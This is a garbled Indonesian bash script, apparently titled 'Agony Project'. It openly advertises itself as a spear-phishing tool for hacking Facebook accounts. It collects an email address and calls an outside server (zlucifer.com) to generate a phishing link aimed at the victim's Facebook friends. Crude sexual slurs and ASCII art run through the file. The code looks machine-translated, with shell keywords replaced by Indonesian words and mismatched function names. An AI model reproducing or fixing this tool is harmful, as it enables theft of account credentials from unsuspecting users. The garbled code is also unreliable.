# RetasFb
Coba bege wa
#! / bin / bash
# ///////////////////////////////////////////////// ////////////////////////////////
# ///////////////////////////////////////////////// ////////////////////////////////
# //// _ _ __ ////
# //// | | (_) / _ | ////
# //// ___ | | _ _ ___ _ | | _ ___ _ __ ////
# //// | _ / | | | | / __ | | _ / _ \ '__ | ////
# //// / / | | | _ | | (__ | | || __ / | ////
# //// / ___ | _ | \ __, _ | \ ___ | _ | _ | \ ___ | _ | ////
# //// ////
# ///////////////////////////////////////////////// ////////////////////////////////
# ///////////////////////////////////////////////// ////////////////////////////////
# PERINGATAN: Kontol adalah sebuah benda di mana kita bisa memainkannya dengan leluasa
Tanpa harus ada izin dari orang lain :)
penderitaan () {
      bersih
      gema  "          ,. * ====. '..' . ==== *., "
      tidur 0,03
      echo  "         .- / c)}}},: ...:, {{{(c \ -. "
      tidur 0,03
      echo  "     _.-'- 6> {{{{{{'' '' '}}}}} <9 -'-._ "
      tidur 0,03
      gema  "    t |}}}}}} {{{{{{| y "
      tidur 0,03
      echo  "     \ __.___. '{{{{{{{}}}}}}}' .___.__ / "
      tidur 0,03
      echo  "          [__ /}}}}}}}} {{{{{{{\ __]   "
      tidur 0,03
      echo  "          {{{. ' '-._ _.-' '.}}} "
      tidur 0,03
      gema  "          }} / \ {{ "
      tidur 0,03
      echo  "          {{KONTOL KUDA}}} "
      tidur 0,03
      echo  "          }} | ============= {{{ "
      tidur 0,03
      gema  "   .------ {{{\,, /}}} ------. "
      tidur 0,03
      echo  " //.-------- ';;' ---------. \\  "
      tidur 0,03
      gema  " ((/// _ \ / _   \\ \)) "
      tidur 0,03
      gema  " (((- '' '-------' '' ----- '' '-------' '' -))) "
      tidur 0,03
}
memuat () {
      echo -e " \ n "
      bar = " >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
      barlength = $ { # bar}
      i = 0
      while (( i < 100 )) ;  melakukan
          n = $ (( i * barlength /  100 ))
          printf  " \ e [00; 32m \ r [% - $ {barlength} s] \ e [00m "  " $ {bar : 0 : n} "
          (( i + = ACAK % 5 + 2 ))
          tidur 0,2
      selesai
}
encrypt_mail = $ ( curl -s http://zlucifer.com/api/hackbae.php ? request = agony )
mulai () {
      bersih
      kesakitan
      echo  " ================================================ = "
      echo  " Syarat korban harus berteman dengan akun FB anda
MASUK DENGAN AKUN FACEBOOK ANDA "
      baca email
      gema
      echo  " Apakah Akun  " $ email  " sudah benar? "
      gema  " y / n? "
      baca cek_email
      if [ $ cek_email  =  " y " ] ;  kemudian
            bersih
            echo  " Membuat tautan .. "
            beban
            kesakitan
            buat = ` curl -s $ encrypt_mail /base64_maker.php ? email = $ email `
            echo  " ================================================ = "
            echo -e $ create
            echo  " Hasil otomatis masuk ke CHATING FB anda "
            echo  " ================================================ = "
      lain
            mulai
      fi
}
bersih
gema  " Memuat .. "
beban
kesakitan
echo  " ================================================ = "
echo Selamat datang kak, Siapa nick kaka ?  # tulisan keluar
baca nick # membaca yang ditulis
bersih
kesakitan
echo  " ================================================ = "
tidur 2
echo  " Agony Project adalah alat untuk meretas Facebook "
tidur 0,2
echo  "    Alat ini adalah metode Spear Phising "
tidur 0,2
echo  "             Menggunakan teknik 18+ "
tidur 0,2
echo  "        Hasil otomatis masuk ke email kamu "
tidur 0,03
echo  " ================================================ = "
echo Selamat datang $ nick  " :) "
gema
echo  " Mulai Proyek Penderitaan? "
gema  " y / n? "
baca mulai
if [ $ mulai  =  " y " ] ;  kemudian
      bersih
      echo  " Memulai Retas FB kentot .. "
      beban
      mulai
lain
